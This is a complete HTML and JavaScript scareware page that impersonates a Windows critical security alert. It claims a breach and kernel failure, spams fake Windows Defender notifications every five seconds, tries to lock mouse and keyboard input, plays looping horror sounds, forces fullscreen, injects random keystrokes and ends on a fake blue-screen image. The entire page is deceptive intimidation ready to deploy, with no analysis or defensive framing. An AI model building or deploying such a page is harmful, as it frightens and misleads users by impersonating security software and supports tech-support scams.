<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Threat Detected</title>
    <style>
        body {
            background: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            overflow: hidden;
        }
        #warning {
            padding-top: 15%;
            font-size: 24px;
        }
        #bsod {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
        }
        #bsod img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div id="warning">
        <h1 style="color: red;">⚠ CRITICAL SYSTEM ALERT ⚠</h1>
        <p>Windows has detected a potential security breach.</p>
        <p>Unauthorized access detected from an unknown source.</p>
        <p>Data integrity compromised. Your files may be at risk.</p>
        <p><strong>DO NOT TURN OFF YOUR COMPUTER.</strong> Immediate action required.</p>
        <p>Error Code: <strong>0xDEAD0001 - Critical Kernel Failure</strong></p>
    </div>

    <div id="bsod">
        <img src="https://i.imgur.com/NKh4Mta.png" alt="BSOD">
    </div>

    <audio id="horrorSound" src="https://www.fesliyanstudios.com/play-mp3/6666" loop></audio>
    <audio id="tickingSound" src="https://www.fesliyanstudios.com/play-mp3/11111" loop></audio>
    
    <script>
        function requestNotificationPermission() {
            if ("Notification" in window) {
                Notification.requestPermission();
            }
        }

        function sendNotification() {
            if (Notification.permission === "granted") {
                new Notification("⚠ Windows Security Alert ⚠", {
                    body: "Suspicious activity detected. Possible malware infection.",
                    icon: "https://upload.wikimedia.org/wikipedia/commons/e/e7/Windows_Defender_logo.svg"
                });
            }
        }

        function startNotifications() {
            setInterval(sendNotification, 5000); // Send notification every 5 seconds
        }

        function freezeMouseAndKeyboard() {
            document.onmousemove = function() { return false; };
            document.onkeydown = function() { return false; };
        }

        function playScarySounds() {
            document.getElementById("horrorSound").play();
            document.getElementById("tickingSound").play();
        }

        function forceFullScreen() {
            document.documentElement.requestFullscreen().catch(console.log);
        }

        function typeRandomKeys() {
            let keys = ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h"];
            setInterval(() => {
                let event = new KeyboardEvent("keydown", { key: keys[Math.floor(Math.random() * keys.length)] });
                document.dispatchEvent(event);
            }, 400);
        }

        function showBSOD() {
            document.getElementById("warning").style.display = "none";
            document.getElementById("bsod").style.display = "block";
        }

        requestNotificationPermission();
        setTimeout(startNotifications, 2000);
        setTimeout(freezeMouseAndKeyboard, 4000);
        setTimeout(playScarySounds, 6000);
        setTimeout(forceFullScreen, 8000);
        setTimeout(typeRandomKeys, 9000);
        setTimeout(showBSOD, 12000);
    </script>
</body>
</html>
